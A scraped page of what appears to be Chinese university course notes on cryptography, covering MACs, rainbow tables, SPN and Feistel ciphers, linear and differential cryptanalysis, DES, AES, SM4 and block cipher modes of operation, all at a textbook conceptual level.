<p>HMAC~K~(x)=SHA-1((K$\oplus$opad)||SHA-1((K$\oplus$ipad)||x))【||表示连接】<br>通过嵌套Hash函数以保证MAC的安全性。一旦结构安全，则可以替换其中的Hash函数</p>
<p>CBC-MAC(x,k)<br>令x=x~1~||…||x~n~<br>IV←00…0<br>y~0~←IV<br>for i=1 to n<br>do y~i~=e~k~(y~i-1~$\oplus$x~i~)<br>return y~n~<br>加密算法具有混乱特性，当基本加密算法满足合适的安全性质时，CBC-MAC是安全的</p>
<p>CCM模式：CTR+CBC-MAC<br>T~i~=ctr+i mod 2^m^，x=x~1~||…，y~i~=e~k~(T~i~)$\oplus$x~i~<br>temp = CBC-MAC(x, K)，y’ = T~0~$\oplus$temp，y=y~1~||y~2~||…||y’</p>
<p><strong>攻击方式</strong>：</p>
<ul>
<li>暴力破解</li>
<li>字典攻击（针对于口令）</li>
<li>彩虹表<br>对随机口令取哈希值，再通过一个从Hash值空间到口令空间均匀分布的函数R，获取到这个口令Hash取函数R后的另一个口令。如此进行下去可以获取到一个口令-Hash-口令-Hash-……的链，可以获取多个这样的链，在存储时只需要存储每条链的第一个和最后一个口令即可，可以大大节省存储空间。<br>如果哈希值为H的口令不是P~i,j~中的任何一个，那么在这条链上一定找不到<br>如果彩虹表链长上界为n，若Hash值为H~0~的口令是P~i,j~中的某一个，最多n次运算后能够使得P~i~等于彩虹表中某条链的链尾<br>为了防止不同链的碰撞，需要使用多个R函数<br>Cain，RainbowCrack等免费使用的公用彩虹表，但主流支持10字符一下的口令。采用salt（盐值）能够有效对抗彩虹表</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B8%8E%E9%AB%98%E7%BA%A7%E5%AF%86%E7%A0%81%E6%A0%87%E5%87%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B8%8E%E9%AB%98%E7%BA%A7%E5%AF%86%E7%A0%81%E6%A0%87%E5%87%86/" class="post-title-link" itemprop="url">密码学基础 Chapter 3——分组密码与高级密码标准</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:58:09" itemprop="dateCreated datePublished" datetime="2023-02-28T22:58:09+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:27" itemprop="dateModified" datetime="2023-03-01T11:31:27+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">密码学基础</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>现代分组密码设计思想：<br>分组密码是一个{0,1}的随机代换<br>基本的变换手段为：代换与置换<br>基本的安全需求：混乱（密钥和明文以及密文之间的依赖关系复杂）、扩散（单个密钥位或明文位的影响尽可能扩散到更多的密文位，即修改明文的某一位需要尽可能导致密文的尽可能多位发生改变）<br>结构 - SPN网络和Feistel结构</p>
<p>迭代密码：将明文经过加密函数G迭代加密多次（需要密钥参与，密钥由密钥扩展算法生成，每一次加密的密钥都不相同）。多次加密能够使得比特位得到扩散，增加了密码的安全性。</p>
<p><strong>SPN网络——代换-置换网络的一轮变换过程：</strong>明文X的一轮加密包含：代换S和置换P。首先与轮密钥异或（白化），然后首先进行小代换，然后将几组的代换结果经过置换后输出。解密首先反置换再反代换即可。如输入为16比特，则代换过程则是将这16比特分为4组，每组均进行代换操作（这些代换需要借助代换表完成）置换则是将代换后的16比特打乱重排后输出。不过 <strong>由于对于任意的线性变换A:x→y=A(x)，有A(x$\oplus$k)=A(x)$\oplus$A(k)</strong>，因此存在有不同的解密顺序也能够解密出正确结果。</p>
<p><strong>Feistel结构的一轮变换过程：将输入分为两份，每一轮运算只运算了一半的输入，交替加密。流密钥函数K与一半不变的输入输入到函数F中，将得到的输出与另一半输入异或后输出。其加密与解密过程完全相同，不同的是解密密钥首先输入K~n~到K~0~，加密密钥为K~0~到K~n~，即逆序使用。非线性函数F不需要可逆。</strong> Feistel的扩散速度比SPN网络慢，因此需要更多的迭代次数</p>
<h2 id="SPN-密码体制定义"><a href="#SPN-密码体制定义" class="headerlink" title="SPN 密码体制定义"></a>SPN 密码体制定义</h2><p>设l,m,Nr是正整数，P=C={0,1}^lm^<br>$K\subseteq(\{0,1\}^{lm})^{Nr+1}$是由初始密钥k用密钥编排算法生成的所有可能的密钥编排方案集合，一个密钥编排方案记为(k^1^, k^2^, …, k^Nr+1^)<br>状态值w长度为l×m，记为w^1^, w^2^, …, w^Nr+1^<br>w可以看成m个长度为l的子串连接而成，记为w~<1>~，w~<2>~，…，w~<m>~，其中<br>w~<i>~=w~(i-1)l+1~,w~(i-1)l+2~,…,w~(i-1)l+l~</p>
<ul>
<li>SPN的特点：结构简单，易于软硬件实现；高效快速，易于扩展和强化——增加l和m可以提高穷举k的难度（但过大可能会占用过多存储资源），也可以使用多个S盒和P盒进一步提高变换的复杂度，增加Nr可以进一步提高密文的混乱程度</li>
</ul>
<h1 id="线性密码分析"><a href="#线性密码分析" class="headerlink" title="线性密码分析"></a>线性密码分析</h1><p>通过分析S盒的线性特性从而发现明文比特、密文比特和密钥比特之间可能存在的概率线性关系。存在一个比特子集使得其中元素的异或表现出非随机的分布来进行分析的密码分析方法。（已知明文攻击，给定明文、密文和S盒，确定k的部分比特）</p>
<h2 id="S盒线性逼近"><a href="#S盒线性逼近" class="headerlink" title="S盒线性逼近"></a>S盒线性逼近</h2><p>考虑一个S盒$\pi$~S~:{0,1}^m^→{0,1}^n^，具有m重输入X=(x~1~,x~2~,…,x~m~)和n重输出Y=(y~1~,y~2~,…,y~n~)。从X和Y中任意选择若干比特通过异或运算构成一个随机变量</p>
<script type="math/tex; mode=display">x_{i_1}\oplus x_{i_2}\oplus...\oplus x_{i_k}\oplus y_{j_1}\oplus y_{j_2}\oplus...\oplus y_{j_l}</script><p>上面的结果很可能不为二分之一，就产生了特殊的概率。</p>
<p>如果选择的输入序列X对应的输出不是Y，则$Pr[Y_1=y_1,…,Y_n=y_n|X_1=x_1,…,X_m=x_m]=0$，否则等于$2^{-m}$</p>
<h3 id="偏差"><a href="#偏差" class="headerlink" title="偏差"></a>偏差</h3><p>取值于{0,1}上的随机变量X，取值为0的概率为p，则取值为1的概率为1-p，X的偏差定义为：$\epsilon=p-\frac{1}{2}$</p>
<h3 id="堆积引理"><a href="#堆积引理" class="headerlink" title="堆积引理"></a>堆积引理</h3><p>设$X_{i_1},X_{i_2},…,X_{i_k}$是取值于{0,1}上的独立随机变量，其偏差依次为$\epsilon_{i_1},…,\epsilon_{i_k}$，定义随机变量$X_{i_1,i_2,…,i_k}=X_{i_1}\oplus X_{i_2}\oplus…X_{i_k}$，以$\epsilon_{i_1,i_2,…,i_k}$表示其偏差，则有</p>
<script type="math/tex; mode=display">\epsilon_{i_1,i_2,...,i_k}=2^{k-1}\prod_{j=1}^k\epsilon_{i_j}</script><p>证明：当k=1时结论显然成立<br>假设k=n时上述结论成立，则当k=n+1时<br>$Pr[X_{i_1}\oplus…\oplus X_{i_{n+1}}=0]=Pr[X_{i_1}\oplus…\oplus X_{i_{n}}=0]Pr[X_{i_{n+1}}=1]+Pr[X_{i_1}\oplus…\oplus X_{i_{n}}=1]Pr[X_{i_{n+1}}=0]\\<br>=(2^{n-1}\prod\epsilon_{i_j}+\frac{1}{2})(\epsilon_{i_{n+1}}+\frac{1}{2})+(\frac{1}{2}-2^{n-1}\prod\epsilon_{i_j})(\frac{1}{2}-\epsilon_{i_{n+1}})\\<br>=\frac{1}{2}+2^n\prod\epsilon_{i_j}$<br>证毕。</p>
<h3 id="线性逼近表："><a href="#线性逼近表：" class="headerlink" title="线性逼近表："></a>线性逼近表：</h3><p><img src="1.jpeg" alt=""><br>a表示输入的4比特，b表示输出的4比特，中间的数字表示满足$(\oplus_{i=1}^{4}a_iX_i)\oplus(\oplus_{i=1}^4b_iY_i)=0$的$(x_1,x_2,x_3,x_4,y_1,y_2,y_3,y_4)$的个数（$(y_1,y_2,y_3,y_4)=\pi_S(x_1,x_2,x_3,x_4)$），容易通过此表获取偏差。选择其中距离8最大的部分可得偏差最大的输入输出对。<strong>理解：线性逼近表是S盒的性质，仅与S盒的置换有关。</strong></p>
<h2 id="线性逼近分析过程"><a href="#线性逼近分析过程" class="headerlink" title="线性逼近分析过程"></a>线性逼近分析过程</h2><p><img src="2.jpeg" alt=""><br><strong>需要注意的是，线性分析只能攻击最后一个密钥，而不能攻击其他密钥，因此在分析过程中应将其他密钥视而不见，因为密钥是确定的，而偏差计算的是一种分布，与前面的密钥无关</strong>。输入和输出应尽量选择对应于线性逼近表中数值偏离8较多的，这样分析成功的概率更大。<br>对于第一轮S盒的输入，追踪其输出到最后并计算偏差</p>
<p>如上图中第一轮输入选B输出选4，则随机变量$T_1=u_5^1\oplus u_7^1\oplus u_8^1\oplus v_6^1$的偏差为$\frac{1}{4}$<br>第二轮输入选4输出选5的偏差绝对值最大。即随机变量$T_2=u_6^2\oplus v_6^2\oplus v_8^2$的偏差为$-\frac{1}{4}$<br>第三轮输入需要注意，第二轮输入的最低位跑到第4个盒去了，所以第三轮输入考虑两个盒，一个是$S_3^2$，输入为4；一个是$S_3^4$，输入为4，输出还是都选5。即$T_3=u_6^3\oplus v_6^3\oplus v_8^3$偏差为$-\frac{1}{4}$；$T_4=u_{14}^3\oplus v_{14}^3\oplus v_{16}^3$偏差为$-\frac{1}{4}$<br>$T_1\oplus T_2\oplus T_3\oplus T_4=x_5\oplus x_7\oplus x_8\oplus v_6^3\oplus v_8^3\oplus v^3_{14}\oplus v_{16}^3\oplus k_5^1\oplus k_7^1\oplus k_8^1\oplus k_6^2\oplus k_6^3\oplus k_{14}^3\\<br>=x_5\oplus x_7\oplus x_8\oplus u_6^4\oplus u_8^4\oplus u^4_{14}\oplus u_{16}^4\oplus k_5^1\oplus k_7^1\oplus k_8^1\oplus k_6^2\oplus k_6^3\oplus k_{14}^3\oplus k_6^4\oplus k_8^4\oplus k_{14}^4\oplus k_{16}^4$</p>
<p>由堆积引理可知$T_1\oplus T_2\oplus T_3\oplus T_4$的偏差为$-\frac{1}{32}$（四者并不独立，因此这不是准确值，只是估算，不过仍然有效），$x_5\oplus x_7\oplus x_8\oplus u_6^4\oplus u_8^4\oplus u^4_{14}\oplus u_{16}^4$具有偏差$±\frac{1}{32}$（后面的k是固定不变的，因此不会计入偏差）</p>
<font color=red>理解：这实际上是一个加密链的分析过程，上面的选择输入是由我们自由选择的，不是说输入就是这个，而是说我们选择哪些比特参与异或。</font>

<p><strong>分析过程梳理：</strong></p>
<ol>
<li>收集尽可能多的在<strong>同一未知密钥k加密的T对明-密文对</strong>，用$\mathbb T$表示明-密文对的集合($|\mathbb T|=T$)，目标是获得候选子密钥($k_{<2>}^5,k_{<4>}^5$，即4组子密钥中的第2组和第4组)</li>
<li>每个候选子密钥分配一个计数器，初始值为0</li>
<li>对于每对明-密文对，尝试所有可能的候选子密钥，计算随机变量$x_5\oplus x_7\oplus x_8\oplus u_6^4\oplus u_8^4\oplus u^4_{14}\oplus u_{16}^4$的结果，若结果为0则相应计数器加1</li>
<li>明-密文对尝试完毕后，真子密钥对应的计数值最接近$\frac{T}{2}±\frac{T}{32}$，其他则接近$\frac{T}{2}$（T越大结果越准确）</li>
</ol>
<p>线性密码分析基于S盒的有效线性逼近<br>是一种已知明文攻击方法，需要较多的明-密文对</p>
<ul>
<li>基于偏差$\varepsilon$的线性攻击要想获得成功，所需明密文对数量T接近$c\varepsilon^2$，c为常数<br>此算法只能分析最后一轮子密钥，缩小的穷举密钥的范围。</li>
</ul>
<h1 id="差分密码分析"><a href="#差分密码分析" class="headerlink" title="差分密码分析"></a>差分密码分析</h1><p>通过分析明文对的差值（异或）对密文对差值的影响来恢复某些密钥比特的分析方法。<br>一种<strong>选择明文攻击方法</strong>，构造若干明文串对，每对明文的异或相等，观察相应密文异或结果。</p>
<h2 id="S盒差分特征"><a href="#S盒差分特征" class="headerlink" title="S盒差分特征"></a>S盒差分特征</h2><p>设$\pi_S:\{0,1\}^m\rightarrow \{0,1\}^n$是一个S盒，长为m的有序比特串对(x,x<em>)，称S盒输入异或为$x’=x\oplus x^</em>$，输出异或为$y’=\pi_S(x)\oplus\pi_S(x^<em>)$，(x’,y’)称为一对差分。<br>对于任意$x’\in\{0,1\}^m$，定义集合$\Delta(x’)$为包含所有输入异或值为x’的有序对(x,x</em>)，该集合含有2^m^对，对集合$\Delta(x’)$中的每一对，可求出S盒的输出异或，一个非均匀的输出分布将会是一个成功差分分析的基础。</p>
<p>需要分析(x’, y’)的分布情况，其中x’是固定的。<strong>（注意每一个y’只会出现偶数次，因为x和x*互换后y和y*互换，然后y’相等）</strong></p>
<p><strong>扩散率：</strong> 条件概率$Pr[y’=b|x’=a]$称为差分(a,b)的扩散率$R_p(a,b)$</p>
<script type="math/tex; mode=display">R_p(a,b)=\frac{N_D(a,b)}{2^m}</script><h2 id="差分分析过程"><a href="#差分分析过程" class="headerlink" title="差分分析过程"></a>差分分析过程</h2><p><img src="3.jpeg" alt=""><br>上图中a表示输入x，b表示y’。<br><img src="4.jpeg" alt=""><br>第一轮应该选择扩散率最大的进行分析，能够分析成功的概率最大。,扩散率为$\frac{1}{2}$<br>第二轮追踪第一轮的输出，到了第三个子密钥中进行分析。输入选择4，输出选择6，扩散率为$\frac{3}{8}$<br>接下来按照图中红线继续分析即可。$S_2^3,S_3^3$的扩散率均为$\frac{3}{8}$<br><img src="5.jpeg" alt=""><br>由图可知总的扩散率即为扩散率的乘积。</p>
<p>输入异或与子密钥无关，但输出有关</p>
<p><strong>正确对</strong>：对于给定密钥，满足差分特征的明文对。对于所有明文输入，正确对产生的概率等于扩散率。</p>
<p>需要找到足够多的四元组（x,x<em>,y,y</em>），其中$x\oplus x^*=x’$固定不变，和线性分析一样，只能分析最后一轮子密钥，对可能的候选子密钥进行猜测，正确对在正确的密钥作用下，满足差分链特征。<br>错误对：带来噪音</p>
<p>上例中测试最后一轮子密钥k^5^的8位，即穷举256个密钥。满足差分特征，则相应密钥的计数器加1</p>
<p><strong>分析过程梳理</strong>：</p>
<ul>
<li>收集尽可能多的在同一未知密钥k加密的T个4重组（x,x<em>,y,y</em>），x’=0000101100000000，用T表示四重组的集合(|<strong>T</strong>|=T)，目标是获得候选子密钥$(k_{<2>}^5,k_{<4>})^5$</li>
<li>每个候选子密钥分配一个计数器，初始值为0,</li>
<li>对每对明-密文，尝试所有可能的候选子密钥，计算出$u’^4$，如果$u’^4=0000011000000110$则相应的计数器加1</li>
<li>T对明-密文尝试完毕后，真子密钥对应的计数器值最大</li>
<li>T越大，结果越准确</li>
</ul>
<p><strong>分析小结</strong>：</p>
<ul>
<li>差分密码分析基于S盒不均匀的差分特征</li>
<li>差分密码分析是一种不确定的明文分析方法，需要较多的明-密文对<ul>
<li>基于差分扩散率$\varepsilon$的差分攻击想要获得成功，所需明-密文对数量T接近$c\varepsilon^{-1}$（少于线性分析），c为某常数</li>
<li>此算法只能分析最后一轮子密钥，缩小了穷举密钥的范围</li>
</ul>
</li>
</ul>
<h1 id="高级加密标准"><a href="#高级加密标准" class="headerlink" title="高级加密标准"></a>高级加密标准</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><ul>
<li>基于Feistel结构</li>
<li>明文、密文、密钥长度为64位</li>
<li>使用8个不同的非线性S盒</li>
<li>使用扩展代换和压缩置换</li>
<li>迭代16轮</li>
<li>加密和解密算法相同，只是密钥编排方式不同</li>
</ul>
<h3 id="算法结构"><a href="#算法结构" class="headerlink" title="算法结构"></a>算法结构</h3><p>输入明文（64位），首先进行预先初始置换IP，然后使用Feistel结构和16个子密钥进行16轮迭代。之后进行逆置换IP^-1^后输出密文</p>
<h4 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h4><p>将64位分为8个字节来看，置换后也是8×8。置换后每一个字节的最后一位属于初始的第一个字节，倒数第二位属于初始的第二个字节，……以此类推，置换后的8字节中每个字节的最后一个字节分别对应初始第一个字节的第2、4、6、8、1、3、5、7个字节。这个置换固定不变。<br><img src="6.jpeg" alt=""></p>
<h4 id="密钥编排过程"><a href="#密钥编排过程" class="headerlink" title="密钥编排过程"></a>密钥编排过程</h4><p>对于一个初始给定的密钥k，首先进行密钥置换$\pi_{kp}$丢掉8比特（这8比特实际上作为校验位存在），对左28位进行循环左移a~i~位，对右28位循环右移a~2~位，其中当i=1,2,9,16时，a~i~=1，其他时候a~i~=2。然后进行压缩置换$\pi_{cp}$再丢掉8比特，形成第一个轮密钥（48位）。<br><img src="7.jpeg" alt=""><br>由上图可知，丢掉的是64位中每个字节的最后一位。<br><img src="8.jpeg" alt=""></p>
<h4 id="迭代过程"><a href="#迭代过程" class="headerlink" title="迭代过程"></a>迭代过程</h4><p>每一次迭代将输入的后32位与48位密钥进行函数处理得到32位与输入前32位异或得到输出的后32位，输出前32位即为输入后32位。<br><img src="9.jpeg" alt=""><br><img src="10.jpeg" alt=""><br>E为扩展置换：<br><img src="11.jpeg" alt=""><br>S盒的代换方法：<br><img src="12.jpeg" alt=""><br>每一组是6比特代换，里面最左边的一位和最右边的一位决定在哪一行代换，中间4位决定代换的值。如最左边为1，最右边为1，就应该在第4行找。S盒一共8个。</p>
<p>P为最终置换：<br><img src="13.jpeg" alt=""></p>
<h3 id="DES算法的安全性"><a href="#DES算法的安全性" class="headerlink" title="DES算法的安全性"></a>DES算法的安全性</h3><p>所有的S盒都是固定的<br>IBM提交算法后，发现反馈的结果修改了所有的S盒<br>S盒的设计准则并未完全公开<br>怀疑算法存在“陷门”</p>
<p>S盒的设计准则</p>
<ul>
<li>每一行是整数0，…，15的一个置换</li>
<li>没有一个S盒是输入变量的线性函数</li>
<li>改变S盒的一个输入位至少要引起两位输出改变</li>
<li>对于任何一个S盒和任意一个输入X，S(X)和S(X $\oplus$ 001100)至少有两个比特不同</li>
<li>对于任何一个S盒，对于任何一个输入对e，f属于{0,1}^4^，S(X)≠S(X $\oplus$ 11ef00)</li>
<li>S盒的任意一位不变，其他5位变化时，输出中的0和1的总和基本相等</li>
</ul>
<p>人们担心实际56比特的密钥长度不足以抵御穷举式攻击，密钥量只有越10^17^个<br>DES算法基本没有发现其他重大的缺陷，线性攻击和差分攻击对计算复杂度有一定影响</p>
<p>DES存在4个<strong>弱密钥</strong>：使用弱密钥加密明文得到密文，对密文进行弱密钥加密和解密均可以恢复明文。（$K_1=K_{16}$）<br>$K_1=0101010101010101\\<br>K_2=fefefefefefefefe\\<br>K_3=1f1f1f1f0e0e0e0e\\<br>K_4=e0e0e0e0f1f1f1f1$<br><strong>半弱密钥</strong>：存在K和K’，使得$E_K\cdot E_{K’}=I$，DES存在12个半弱密钥。<br>如$K_1=e001e001f101f101,K_2=01e001e001f101f1$<br><strong>补密钥</strong>：$DES_{\bar{K}}(\bar{M})=\overline{DES_K(M)}$，补密钥将密钥的所有位取反得到。 </p>
<p>DES不是幂等的，不能构成封闭群，因此可以通过自身乘积以提高安全性，其中三重DES使用最为广泛，使用不同密钥对其加密三次。</p>
<ul>
<li>中间相遇攻击双重DES：穷举密钥加密P~1~，保存结果，一共有2^56^个值</li>
<li>穷举前解密C~1~，比较P~1~加密的结果，若相同使用当前解密的密钥K~2~和表中对应的K~1~来加密P~2~，若得到C~2~，则说明得到正确的K~1~和K~2~，否则继续寻找。总复杂度为2^57^，但空间使用也很大。</li>
</ul>
<p>三重DES的工作方式：</p>
<ul>
<li>DES-EEE3：三个不同密钥三次加密</li>
<li>DES-EDE3：三个不同密钥加密-解密-加密</li>
<li>DES-EEE2：两个不同密钥，K~1~=K~3~，加密3次</li>
<li>DES-EDE2：两个不同密钥，K~1~=K~3~，加密-解密-加密</li>
</ul>
<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><ul>
<li>比三重DES快</li>
<li>至少与三重DES一样安全</li>
<li>数据分组长度为128比特</li>
<li>密钥长度为128/192/256比特</li>
<li><p>可在全世界范围内免费得到</p>
</li>
<li><p>采用SPN结构，加密和解密相似</p>
</li>
<li>能够有效抵抗所有已知攻击</li>
<li>没有发现弱密钥和补密钥</li>
<li>结构简单，运算速度快</li>
<li>支持128位分组，支持128/192/256位密钥</li>
<li>轮数Nr依赖密钥长度，分别为10/12/14</li>
</ul>
<p><img src="14.jpeg" alt=""><br><img src="15.jpeg" alt=""><br><img src="16.jpeg" alt=""></p>
<h3 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h3><p>AES的S盒代换是基于有限域$\mathbb F_{2^8}=\mathbb Z_2[x]/(x^8+x^4+x^3+x+1)$<br>$a=a_7a_6a_5a_4a_3a_2a_1a_0$</p>
<script type="math/tex; mode=display">\sum_{i=0}^7a_ix^i</script><p>字节代换：$y=Ax^{-1}+c$</p>
<script type="math/tex; mode=display">A=\begin{pmatrix}
1 & 1 & 1 & 1 & 1 & 0 & 0 & 0\\
0 & 1 & 1 & 1 & 1 & 1 & 0 & 0\\
0 & 0 & 1 & 1 & 1 & 1 & 1 & 0\\
0 & 0 & 0 & 1 & 1 & 1 & 1 & 1\\
1 & 0 & 0 & 0 & 1 & 1 & 1 & 1\\
1 & 1 & 0 & 0 & 0 & 1 & 1 & 1\\
1 & 1 & 1 & 0 & 0 & 0 & 1 & 1\\
1 & 1 & 1 & 1 & 0 & 0 & 0 & 1
\end{pmatrix},
c=\begin{pmatrix}0\\1\\1\\0\\0\\0\\1\\1\end{pmatrix}</script><p>计算z=f(x)在有限域下的乘法逆元z^-1^，使用辗转相除法计算。</p>
<h3 id="行移位变换"><a href="#行移位变换" class="headerlink" title="行移位变换"></a>行移位变换</h3><p>对状态矩阵每一行进行循环左移操作，第i行循环左移i-1个字节。（明文看做4*4字节的矩阵）<br><img src="17.jpeg" alt=""></p>
<h3 id="列混合变换"><a href="#列混合变换" class="headerlink" title="列混合变换"></a>列混合变换</h3><p><img src="18.jpeg" alt=""><br>也就是和一个固定的矩阵相乘。</p>
<h3 id="与轮密钥异或"><a href="#与轮密钥异或" class="headerlink" title="与轮密钥异或"></a>与轮密钥异或</h3><p>与K~Nr~异或即可。</p>
<h3 id="AES密钥编排算法"><a href="#AES密钥编排算法" class="headerlink" title="AES密钥编排算法"></a>AES密钥编排算法</h3><p>若密钥长度为128字节，一共迭代10轮，需要11个轮密钥，每一个轮密钥为128位，密钥编排算法需要用128位主密钥key生成11个128位的轮密钥。<br>将4*4密钥矩阵中的每一列当做一个字，易知密钥编排算法需要输出44个字，表示11个轮密钥，AES密钥编排算法使用了S盒变换（与DES不同）</p>
<p>首先定义了10个常数：<br><img src="19.jpeg" alt=""><br>初始密钥有4个字W~[0]~，W~[1]~，W~[2]~，W~[3]~，为第一次派生得来。之后的字的生成方式为：对于W~[i]~，由于W~[3]~=(K~12~，K~13~，K~14~，K~15~)^T^，此时i=4，首先将第一字节与第四字节交换(K~15~，K~12~，K~13~，K~14~)^T^，然后逐字节进行<strong>代换</strong>。最后如果i整除4，就与上面的10个常数之一Rcon[i/4]异或（实际上只改了最高字节）。最后再与W~[4-4]~进行<strong>异或</strong>。一直计算到W~[43]~完成。<br>当列数不同时（密钥长度为192和256比特）时，代换与异或的判断条件有所改变。</p>
<h2 id="SM4加密算法"><a href="#SM4加密算法" class="headerlink" title="SM4加密算法"></a>SM4加密算法</h2><ul>
<li>分组长度为128比特，密钥为128比特</li>
<li>是对称加密算法，共需要32轮迭代，在解密算法中密钥逆序使用</li>
<li>密钥扩展算法采用32轮迭代结构，与加密算法类似</li>
<li>基于非均衡Feistel结构</li>
</ul>
<p>每一轮迭代，产生32位新的比特序列，放在128位的最后面，前面的128位保留后96位放在前面，舍弃最前面的32位，类似于一个内部迭代过程。最后经过反序变换输出密文。<br>$x_4=x_0\oplus T(x_1\oplus x_2\oplus x_3\oplus rk_0)$<br><img src="20.jpeg" alt=""><br><img src="21.jpeg" alt=""></p>
<h1 id="分组密码的工作模式"><a href="#分组密码的工作模式" class="headerlink" title="分组密码的工作模式"></a>分组密码的工作模式</h1><p>由基本密码、一些反馈和一些简单运算组合而成<br>每个密码标准在描述密码算法同时都定义相关工作模式</p>
<ul>
<li>电子密码本 ECB</li>
<li>密码分组链接 CBC</li>
<li>密码反馈 CFB</li>
<li>输出反馈 OFB</li>
<li>计数器模式 CTR</li>
</ul>
<h2 id="电子密码本模式——ECB"><a href="#电子密码本模式——ECB" class="headerlink" title="电子密码本模式——ECB"></a>电子密码本模式——ECB</h2><p>使用相同的密钥对每一块进行加密，对每一块加密后将每一块密文组合在一起即得到密文。<br><strong>分组之间没有任何关系</strong></p>
<p>优点：</p>
<ul>
<li>可以进行并行处理</li>
<li>简单有效</li>
<li>不存在错误传播问题。（加密产生的错误只会限制在一块之中）</li>
</ul>
<p>缺点：</p>
<ul>
<li>相同明文分组会加密成相同密文分组</li>
<li>对明文的主动攻击是可能的：可能会替换、重排、删除、重放信息块而改变原有明文的意义</li>
<li>适合传输短信息（如加密口令）</li>
</ul>
<h2 id="密码分组链接模式——CBC"><a href="#密码分组链接模式——CBC" class="headerlink" title="密码分组链接模式——CBC"></a>密码分组链接模式——CBC</h2><p>前一块明文的加密结果参与下一块的密文生成流程，看上去像是有链接关系。<br>分块之间相互影响：</p>
<ul>
<li>信息块不容易被替换、重排、删除、重放</li>
<li>安全性好于ECB</li>
<li>适合传输长度大于64位的报文</li>
<li>是大多数系统的标准模式（SSL、IPSec等）</li>
</ul>
<p>不足：</p>
<ul>
<li>没有已知的并行算法</li>
<li>需要共同初始化向量IV</li>
<li>存在错误传播现象，前面出错后面就全错了</li>
</ul>
<h2 id="密码反馈模式——CFB"><a href="#密码反馈模式——CFB" class="headerlink" title="密码反馈模式——CFB"></a>密码反馈模式——CFB</h2><p>将分组密码用于异步序列密码，数据可以在比分组小得多的单元里进行加密。<br>适用于实时加密字节级别的数据的情况<br><img src="22.jpeg" alt=""></p>
<script type="math/tex; mode=display">C_0=IV（初始向量）\\
C_1=E_k(C_0)\oplus P_1\\
C_{i+1}=E_k(C_i)\oplus P_i\\
P_1=C_1\oplus E_k(C_0)\\
P_i=C_{i+1}\oplus E_k(C_i)</script><p>特点：</p>
<ul>
<li>没有已知的并行实现算法</li>
<li>隐藏的明文模式</li>
<li>需要共同的移位寄存器初始值IV</li>
<li>存在错误传播（一个单元损坏影响多个单元）</li>
</ul>
<h2 id="输出反馈模式——OFB"><a href="#输出反馈模式——OFB" class="headerlink" title="输出反馈模式——OFB"></a>输出反馈模式——OFB</h2><p>将分组密码算法用于同步序列密码的方式<br>与CFB类似，不同的是进入移位寄存器的数据<strong>和被加密明文无关</strong>，只与初始向量无关。</p>
<p><img src="23.jpeg" alt=""></p>
<p>特点：</p>
<ul>
<li>没有已知的并行实现算法</li>
<li>需要共同的移位寄存器初始值IV</li>
<li>不存在错误传播</li>
<li>可以离线工作（离线生成密钥流，在线直接进行加密工作即可，相当于预处理过程）</li>
<li>密钥序列最终会重复</li>
</ul>
<h2 id="计数器模式——CTR"><a href="#计数器模式——CTR" class="headerlink" title="计数器模式——CTR"></a>计数器模式——CTR</h2><p>引入一个计数器，使用密钥加密计数器的值，然后与明文异或。下一次加密将计数器加一相同操作。</p>
<ul>
<li>可以进行并行加密</li>
<li>可以离线工作（预处理）</li>
<li>吞吐量仅受可使用并行数量的限制</li>
<li>加密数据块的随机访问</li>
<li>可证明安全</li>
<li>简单性（只要求实现加密算法）</li>
<li>密钥只能使用一次，除非能维持很长的计数器</li>
</ul>
